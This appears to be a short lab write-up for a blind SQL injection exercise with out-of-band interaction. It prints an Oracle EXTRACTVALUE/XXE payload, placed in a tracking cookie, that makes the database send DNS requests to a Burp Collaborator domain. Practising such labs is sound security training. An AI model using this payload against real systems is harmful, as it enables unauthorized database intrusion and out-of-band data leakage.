## Lab Description :

![image](https://user-images.githubusercontent.com/67383098/235471828-1077003d-cd99-4b8b-987b-027fd342e3b8.png)



## Solution :

Captured request 

![image](https://user-images.githubusercontent.com/67383098/235472781-c2b58862-47ad-43b0-9349-6174fc085bc8.png)


The query made in the lab looks something like thi

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

We don't know which database we are dealing with , so we try all the payloads for each databases given in cheatsheat.

![image](https://user-images.githubusercontent.com/67383098/235473162-4fcaf290-5d13-49ca-8f7f-73e5615025ce.png)

First we start with ORACLE db,

Open burp collaborator client, copy one of the domain provided to clipbopard,

![image](https://user-images.githubusercontent.com/67383098/235473410-2fbcfcda-6aa3-4d9e-93ac-7159d6764ef8.png)

Use the payload 

```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://darew0kje2n3ycngqynq63tuvl1cp1.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

So the query would made to db would look like this ,

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://darew0kje2n3ycngqynq63tuvl1cp1.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

This triggers a DNS request to our collaborater server, and once we get a `200 OK` response, if we click `Poll Now` button in Burp Collaborator, we get **4 DNS requests**

![image](https://user-images.githubusercontent.com/67383098/235474398-69761a6f-6b72-454c-a937-df7bb3fbab87.png)

![image](https://user-images.githubusercontent.com/67383098/235474486-c75b08f4-8683-41ca-92f5-8d6933053904.png)
